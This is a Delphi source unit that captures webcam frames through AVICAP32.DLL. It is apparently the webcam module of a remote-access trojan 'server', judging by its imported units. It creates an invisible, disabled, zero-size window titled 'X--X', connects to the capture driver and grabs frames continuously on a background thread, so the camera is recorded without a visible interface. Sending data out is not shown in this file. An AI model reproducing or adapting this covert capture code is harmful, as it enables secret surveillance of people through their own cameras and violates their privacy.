Unit UnitWebcam;

interface

uses
  windows,
  unitserverutils;

var
  WebcamWindow: HWND;
  FCapHandle: THandle;
  DriverEmUso: boolean;

const
  WM_CLOSE            = $0010;
  WM_QUIT             = $0012;
  WM_USER             = $0400;
  WM_DESTROY          = $0002;
  WM_CAP_START                        = WM_USER;
  WM_CAP_DRIVER_DISCONNECT            = WM_CAP_START + 11;
  WM_CAP_DRIVER_CONNECT               = WM_CAP_START + 10;
  WM_CAP_SET_PREVIEW                  = WM_CAP_START + 50;
  WM_CAP_SET_OVERLAY                  = WM_CAP_START + 51;
  WM_CAP_SET_PREVIEWRATE              = WM_CAP_START + 52;
  WM_CAP_GRAB_FRAME_NOSTOP            = WM_CAP_START + 61;
  WM_CAP_SET_CALLBACK_FRAME           = WM_CAP_START + 5;
  WM_CAP_SAVEDIB                      = WM_CAP_START + 25;
  WM_CAP_EDIT_COPY                    = WM_CAP_START + 30;
  WM_CAP_GRAB_FRAME                   = WM_CAP_START + 60;

  PICWIDTH                            = 640;
  PICHEIGHT                           = 480;
  SUBLINEHEIGHT                       = 18;
  EXTRAHEIGHT                         = 400;

procedure InitCapture; stdcall;
procedure DestroyCapture; stdcall;

implementation

uses
  StreamUnit,
  unitdiversos;
  
var
  TimerThreadID: cardinal;
  WndClass: TWndClass;
  hInst: HWND;
  Msg: TMsg;

function capCreateCaptureWindow(lpszWindowName: LPCSTR;
  dwStyle: DWORD;
  x, y,
  nWidth,
  nHeight: integer;
  hwndParent: HWND;
  nID: integer): HWND; stdcall;
  external 'AVICAP32.DLL' name 'capCreateCaptureWindowA';

procedure Timer;
begin
    try
      SendMessage(FCapHandle, WM_CAP_SET_CALLBACK_FRAME, 0, 0);
      SendMessage(FCapHandle, WM_CAP_GRAB_FRAME_NOSTOP, 1, 0);
    except
    end;
end;

procedure StartCapture;
begin
  DriverEmUso := false;
  FCapHandle := capCreateCaptureWindow('Video', WS_CHILD or WS_VISIBLE, 0, 0,
    PICWIDTH, PICHEIGHT, WebcamWindow, 1);
  if SendMessage(FCapHandle, WM_CAP_DRIVER_CONNECT, 0, 0) <> 1 then
  begin
    SendMessage(FCapHandle, WM_CAP_DRIVER_DISCONNECT, 0, 0);
    DriverEmUso := true;
    exit;
  end;
  SendMessage(FCapHandle, WM_CAP_SET_PREVIEWRATE, 1, 0);
  sendMessage(FCapHandle, WM_CAP_SET_OVERLAY, 1, 0);
  SendMessage(FCapHandle, WM_CAP_SET_PREVIEW, 1, 0);
  CreateThread(nil, 0, @Timer, nil, 0, TimerThreadID);
end;

procedure DestroyCapture; stdcall;
begin
  FCapHandle:= capCreateCaptureWindow('Video', WS_CHILD or WS_VISIBLE, 0, 0,
    PICWIDTH, PICHEIGHT, WebcamWindow, 1);
  SendMessage(FCapHandle, WM_CAP_DRIVER_DISCONNECT, 0, 0);
  FCapHandle := 0;
  UnRegisterClass('MainForm', hInst);
end;

function WindowProc(HWND, Msg, wParam, lParam: longint): longint; stdcall;
begin
  Result := DefWindowProc(HWND, Msg, wParam, lParam);
  if Msg = WM_DESTROY then
    DestroyCapture;
end;

procedure InitCapture; stdcall;
begin
  hInst := GetModuleHandle(nil);
  with WNDClass do begin
    Style := CS_PARENTDC;
    hIcon := LoadIcon(hInstance, IDI_APPLICATION);
    lpfnWndProc := @WindowProc;
    hInstance := hInst;
    hbrBackground := COLOR_BTNFACE + 1;
    lpszClassName := 'MainForm';
    hCursor := LoadCursor(0, IDC_ARROW);
  end;
  RegisterClass(WNDClass);
  WebcamWindow := CreateWindowEx(0, 'MainForm', 'X--X', WS_DISABLED or
                                                        WS_POPUP,
                                                        0,
                                                        0,
                                                        0,
                                                        0,
                                                        0,
                                                        0,
                                                        hInst,
                                                        nil);
  StartCapture;
  while (GetMessage(Msg, WebcamWindow, 0, 0)) and (findwindow(nil, 'X--X') > 0) do
  begin
    TranslateMessage(Msg);
    DispatchMessage(Msg);
  end;
end;

end.
